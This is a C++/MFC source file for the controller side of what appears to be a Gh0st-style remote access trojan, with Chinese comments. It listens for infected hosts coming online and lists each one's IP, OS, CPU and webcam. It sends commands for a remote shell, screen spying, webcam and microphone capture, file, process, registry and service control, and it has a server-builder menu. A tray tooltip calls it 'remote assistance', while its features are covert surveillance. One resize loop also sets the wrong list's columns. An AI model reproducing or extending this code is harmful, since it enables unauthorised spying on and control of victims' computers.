
// RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "RemoteDlg.h"
#include "afxdialogex.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"
#include "SettingDlg.h"
#include "Common.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "ScreenSpyDlg.h"
#include "FloatWnd.h"
#include "VideoDlg.h"
#include "RegDlg.h"
#include "ServerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif



typedef struct
{
	char*     szTitle;           //列表的名称
	int		  nWidth;            //列表的宽度
}COLUMNSTRUCT;



COLUMNSTRUCT g_Column_Data_Online[] = 
{
	{"IP",			    148	},
	{"区域",			150	},
	{"计算机名/备注",	160	},
	{"操作系统",		128	},
	{"CPU",			    80	},
	{"摄像头",		    81	},
	{"PING",			81	}
};

int g_Column_Count_Online = 7; //列表的个数
int g_Column_Online_Width = 0; 


COLUMNSTRUCT g_Column_Data_Message[] = 
{
	{"信息类型",		80	},
	{"时间",			100	},
	{"信息内容",	    660	}
};

int g_Column_Count_Message = 3; //列表的个数
int g_Column_Message_Width = 0; 




//状态栏使用的数组
static UINT indicators[] =
{
	IDR_STATUSBAR_STRING,
	
};


CIOCPServer *m_iocpServer   = NULL;  //IOCP类的全局指针
CRemoteDlg  *g_pPCRemoteDlg = NULL;  //主对话框的全局指针在 构造函数中进行赋值

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:

	
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	
END_MESSAGE_MAP()


// CRemoteDlg 对话框




CRemoteDlg::CRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CRemoteDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	g_pPCRemoteDlg = this;
	iCount = 0;
}

void CRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CRemoteDlg::OnRclickOnline)
	ON_COMMAND(IDM_ONLINE_CMD, &CRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_SERVER, &CRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CRemoteDlg::OnOnlineRegister)
	ON_COMMAND(IDM_ONLINE_DELETE, &CRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_CLOSE, &CRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_ABOUT, &CRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_SET, &CRemoteDlg::OnMainSet)
	ON_COMMAND(IDM_MAIN_BUILD, &CRemoteDlg::OnMainBuild)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CRemoteDlg::OnNotifyShow)
	ON_COMMAND(IDM_NOTIFY_CLOSE, &CRemoteDlg::OnNotifyClose)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)  
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog) 
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_COMMAND(IDM_ONLINE_REGEDIT, &CRemoteDlg::OnOnlineRegedit)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegEditDialog)
	ON_MESSAGE(WM_OPENSERVERDIALOG, OnOpenServerDialog)
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify) 
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)      
	ON_WM_CLOSE()
END_MESSAGE_MAP()



void CRemoteDlg::OnOnlineRegedit()
{
	// TODO: 在此添加命令处理程序代码
    //MessageBox("注册表管理");

	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}



void CRemoteDlg::OnOnlineServer()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("服务管理");
	BYTE	bToken = COMMAND_SERVICES;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));

}


// CRemoteDlg 消息处理程序

BOOL CRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	RECT  rect1;

	SystemParametersInfo(SPI_GETWORKAREA, 0, &rect1,0);


	rect1.bottom=48;
	rect1.left+=rect1.right-48;

	m_FloatWnd = new CFloatWnd;

	m_FloatWnd->Create(IDD_DIALOG_FLOAT,this);
	m_FloatWnd->MoveWindow(&rect1);  
	m_FloatWnd->ShowWindow(SW_SHOW);
		m_FloatWnd->OnUpdateTransparent(255);



	

	InitList();                    //列表框初始化
	CreatStatusBar();              //状态栏设置

	CreateToolBar();               //工具条设置

	InitTray(&nid);                //系统托盘

	


	ShowMessage(true,"软件初始化成功...");
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;               //加多少根据运行效果
	MoveWindow(rect);

	//Activate(2356,9999);         //替换函数为ListenPort
	ListenPort();
	
	//TestOnline();               //测试代码
	



	HMENU hmenu;
	hmenu=LoadMenu(NULL,MAKEINTRESOURCE(IDR_MENU_MAIN));   //载入菜单资源
	::SetMenu(this->GetSafeHwnd(),hmenu);                  //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                    //显示菜单


	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CRemoteDlg::OnSize(UINT nType, int cx, int cy)   //这里的cx是对话框从左到右的长度 cy是对话框从上到下的长度
{
	CDialogEx::OnSize(nType, cx, cy);


	if (SIZE_MINIMIZED==nType)
	{
		return;
	}

	if (m_CList_Online.m_hWnd!=NULL)   //（控件也是窗口因此也有句柄）
	{
		CRect rc;
		rc.left= 1;          //列表的左坐标
		rc.top = 80;         //列表的上坐标
		rc.right = cx-1;     //列表的右坐标
		rc.bottom= cy-160;   //列表的下坐标
		m_CList_Online.MoveWindow(rc);



		
		for(int i=0;i<g_Column_Count_Online;i++){           //遍历每一个列
			double Temp=g_Column_Data_Online[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                 //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));       //设置当前的宽度
		}
	}
	if (m_CList_Message.m_hWnd!=NULL)
	{
		CRect rc;
		rc.left = 1;        //列表的左坐标
		rc.top = cy-156;    //列表的上坐标
		rc.right  = cx-1;   //列表的右坐标
		rc.bottom = cy-20;  //列表的下坐标
		m_CList_Message.MoveWindow(rc);

		for(int i=0;i<g_Column_Count_Message;i++){           //遍历每一个列
			double Temp=g_Column_Data_Message[i].nWidth;     //得到当前列的宽度
			Temp/=g_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			Temp*=cx;                                        //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth=Temp;                                  //转换为int 类型
			m_CList_Online.SetColumnWidth(i,(lenth));        //设置当前的宽度
		}
	}

	//状态栏设置
	if(m_wndStatusBar.m_hWnd!=NULL){    //当对话框大小改变时 状态条大小也随之改变
		CRect rc;
		rc.top=cy-20;
		rc.left=0;
		rc.right=cx;
		rc.bottom=cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
	}

	//工具条设置
	if(m_ToolBar.m_hWnd!=NULL)                  //工具条
	{
		CRect rc;
		rc.top=rc.left=0;
		rc.right=cx;
		rc.bottom=80;
		m_ToolBar.MoveWindow(rc);             //设置工具条大小位置
	}
}


// 初始化成员变量
int CRemoteDlg::InitList(void)
{

	for (int i = 0; i < g_Column_Count_Online; i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth;  
	}


	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);

		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}


	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	return 0;
}


void CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext)
{
	m_CList_Online.InsertItem(0,strIP);                                
	m_CList_Online.SetItemText(0,ONLINELIST_ADDR,strAddr);      
	m_CList_Online.SetItemText(0,ONLINELIST_COMPUTER_NAME,strPCName); 
	m_CList_Online.SetItemText(0,ONLINELIST_OS,strOS); 
	m_CList_Online.SetItemText(0,ONLINELIST_CPU,strCPU);
	m_CList_Online.SetItemText(0,ONLINELIST_VIDEO,strVideo);
	m_CList_Online.SetItemText(0,ONLINELIST_PING,strPing); 
	m_CList_Online.SetItemData(0,(DWORD)pContext);

	ShowMessage(true,strIP+"主机上线");
}




void CRemoteDlg::ShowMessage(bool bOk, CString strMsg)
{
	CString strIsOK,strTime;
	CTime t=CTime::GetCurrentTime();
	strTime=t.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOK="执行成功";
	}else{
		strIsOK="执行失败";
	}
	m_CList_Message.InsertItem(0,strIsOK);
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);



	CString strStatusMsg;
	if (strMsg.Find("上线")>0)         //处理上线还是下线消息
	{
		iCount++;
	}else if (strMsg.Find("下线")>0)
	{
		iCount--;
	}else if (strMsg.Find("断开")>0)
	{
		iCount--;
	}
	iCount=(iCount<=0?0:iCount);         //防止iCount 有-1的情况
	strStatusMsg.Format("有%d个主机在线",iCount);
	m_wndStatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字


}


//测试OnLine
void CRemoteDlg::TestOnline(void)
{
	//AddList("192.168.0.1","本机局域网","Shine","Windows7","2.2GHZ","有","1000");
	//AddList("192.168.0.2","本机局域网","Shine","Windows7","2.2GHZ","有","1000");
	//AddList("192.168.0.3","本机局域网","Shine","Windows7","2.2GHZ","有","1000");
	
}

void CRemoteDlg::OnRclickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码


	CMenu	popup;
	popup.LoadMenu(IDR_MENU_LIST_ONLINE);             //加载菜单资源
	CMenu*	pM = popup.GetSubMenu(0);                 //获得菜单的子项
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_CList_Online.GetSelectedCount() == 0)       //如果没有选中
	{ 
		for (int i = 0;i<count;i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CRemoteDlg::OnOnlineCmd()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("终端管理");

	BYTE	bToken = COMMAND_SHELL;             //向被控端发送一个COMMAND_SHELL命令
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("进程管理");

	BYTE	bToken = COMMAND_SYSTEM;           //向被控端发送一个COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineWindow()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("窗口管理");

	BYTE	bToken = COMMAND_WSLIST;         
	SendSelectCommand(&bToken, sizeof(BYTE));

}


void CRemoteDlg::OnOnlineDesktop()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("桌面管理");
	BYTE	bToken = COMMAND_SCREEN_SPY;  //向被控端发送COMMAND_SCREEN_SPY
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineFile()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("文件管理");

	BYTE	bToken = COMMAND_LIST_DRIVE;            //向被控端发送消息COMMAND_LIST_DRIVE 在被控端中搜索COMMAND_LIST_DRIVE   TOKEN_DRIVE_LIST
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CRemoteDlg::OnOnlineAudio()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("音频管理");

	BYTE	bToken = COMMAND_AUDIO;                 //向被控端发送命令
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CRemoteDlg::OnOnlineVideo()
{
	// TODO: 在此添加命令处理程序代码
	//MessageBox("视频管理");



	BYTE	bToken = COMMAND_WEBCAM;                 //向被控端发送命令
	SendSelectCommand(&bToken, sizeof(BYTE));	
}




void CRemoteDlg::OnOnlineRegister()
{
	// TODO: 在此添加命令处理程序代码

	MessageBox("注册表管理");
}


void CRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码

	CString strIP;
	int iSelect = m_CList_Online.GetSelectionMark( );                   //获得选择项的索引
	strIP = m_CList_Online.GetItemText(iSelect,ONLINELIST_IP);          //通过选项中的索引获得数据0项的IP
	m_CList_Online.DeleteItem(iSelect);                                 //删除该项
	strIP+="断开连接";
	ShowMessage(true,strIP);                                            //向MessageList控件中投递消息
}


void CRemoteDlg::OnMainClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE);
}


void CRemoteDlg::OnMainAbout()
{
	// TODO: 在此添加命令处理程序代码
	//调用系统中About对话框

	CAboutDlg dlgAbout;
	dlgAbout.DoModal();    //这是创建一个对话框的方法
}


void CRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}


void CRemoteDlg::OnMainBuild()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("服务端生成");
}

//创建状态栏
void CRemoteDlg::CreatStatusBar(void)
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return ;      
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd,rc);             
	m_wndStatusBar.MoveWindow(rc);  
}


//初始化工具条
void CRemoteDlg::CreateToolBar(void)
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{
	
		return;     
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //和我们的位图资源相关联
	RECT rt,rtMain;
	GetWindowRect(&rtMain);   //得到整个窗口的大小
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);

	m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(9,"参数设置"); 
	m_ToolBar.SetButtonText(10,"生成服务端"); 
	m_ToolBar.SetButtonText(11,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////系统托盘
void CRemoteDlg::InitTray(PNOTIFYICONDATA nid)
{
	nid->cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
	nid->hWnd = m_hWnd;           //父窗口
	nid->uID = IDR_MAINFRAME;     //icon  ID
	nid->uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	nid->uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	nid->hIcon = m_hIcon;                               //icon 变量
	CString str="Remote远程协助软件.........";       //气泡提示
	lstrcpyn(nid->szTip, (LPCSTR)str, sizeof(nid->szTip) / sizeof(nid->szTip[0]));
	Shell_NotifyIcon(NIM_ADD, nid);   //显示托盘

}

void CRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: 
	case WM_LBUTTONDBLCLK: 
		if (!IsWindowVisible()) 
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: 
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
			point.x, point.y, this, NULL); 
		//PostMessage(WM_USER, 0, 0);
		break;
	}
}



void CRemoteDlg::OnNotifyShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
}


void CRemoteDlg::OnNotifyClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE);
}


void CRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	Shell_NotifyIcon(NIM_DELETE, &nid);
	CDialogEx::OnClose();
}


void CRemoteDlg::Activate(UINT uPort, UINT uMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)           //这里是我们自己构建的IOCP类 他是我们远程控制的通信模型
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;        //动态申请我们的类对象

	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, uPort))   //这里的NotifyProc是套机字的处理函数  100000 是我们的最大处理量   uPort 是通信的端口
	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}
		str.Format("监听端口: %d成功", uPort);
		ShowMessage(true,str);
	}

	else
	{
		
		str.Format("监听端口: %d失败", uPort);
		ShowMessage(false,str);
	}


}


void CRemoteDlg::ListenPort(void)
{
	int	nPort = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //读取ini 文件中的监听端口
	int	nMaxConnection = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //读取最大连接数
	if (nPort == 0)
	{
		nPort = 2356;                 //如果文件中没有数据就设置默认数据
	}
	if (nMaxConnection == 0)
	{
		nMaxConnection = 10000;
	}
	Activate(nPort,nMaxConnection);             //开始监听
}



void CALLBACK CRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{

	//::MessageBox(NULL,"有连接到来!!","",NULL);   //测试代码

	try
	{

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			break;
		case NC_RECEIVE_COMPLETE:
			{
				ProcessReceiveComplete(pContext); //这里时完全接收 处理发送来的数据
				break;
			}
		}
	}catch(...){}
}

//
void CRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)  //GetQueue    ProcessIOMessage  Work
{
	if (pContext == NULL)
		return;


	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];    //0 Key  1  DlgHandle

	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
	{
		switch (pContext->m_Dialog[0])
		{
		case SHELL_DLG:
			{
				((CShellDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case SYSTEM_DLG:
			{
				((CSystemDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case FILEMANAGER_DLG:
			{
				((CFileManagerDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case AUDIO_DLG:
			{
				((CAudioDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case SCREENSPY_DLG:
			{
				((CScreenSpyDlg *)dlg)->OnReceiveComplete();
				break;
			}
		case WEBCAM_DLG:
			{
				((CVideoDlg *)dlg)->OnReceiveComplete();
				break;
			}

		case REGEDIT_DLG:
			{
				((CRegDlg *)dlg)->OnReceiveComplete();
				break;
			}
		
		case SERVER_DLG:
			{
				((CServerDlg *)dlg)->OnReceiveComplete();
				break;

			}
		
		default:
			break;
		}

		return;
	}


	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])    
	{                                                           
	case TOKEN_LOGIN: // 上线包

		{
			//这里处理上线
			if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);      //向窗口投递用户上线的消息 
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));           //向被控端发送应答请求


			break;
		}
	case TOKEN_SHELL_START:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
			break;

		}
	case TOKEN_WSLIST:
	case TOKEN_PSLIST:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);      //打开进程枚举的对话框
			break;
		}
	case TOKEN_DRIVE_LIST:																//驱动器列表
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
			break;
		}
	case TOKEN_BITMAPINFO:
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);  //远程桌面
			break;
		}	
	case TOKEN_AUDIO_START:	
		{																			   //远程语音
			g_pPCRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
			break;
		}

	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
			break;
		}

	case TOKEN_REGEDIT:            //注册表
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
			break;
		}
	case  TOKEN_SERVERLIST:       //服务
		{
			g_pPCRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
			break;
		}
	
	
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}


LRESULT CRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)    //这里一个被控端上线我们要将得到的数据包放在我们列表中
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext	*pContext = (ClientContext *)lParam;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
	
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();



		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
		//IP
		strIP=IPAddress;

		//主机名称
		strPCName=LoginInfo->HostName;
		//系统
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Vista";  
		}
		strOS.Format
			(
			"%s SP%d (Build %d)",
		
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		

		//CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		
		//网速
		strPing.Format("%d", LoginInfo->dwSpeed);
		


		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
	
		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);
	
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,pContext);
	}catch(...){}

	return 0;
}



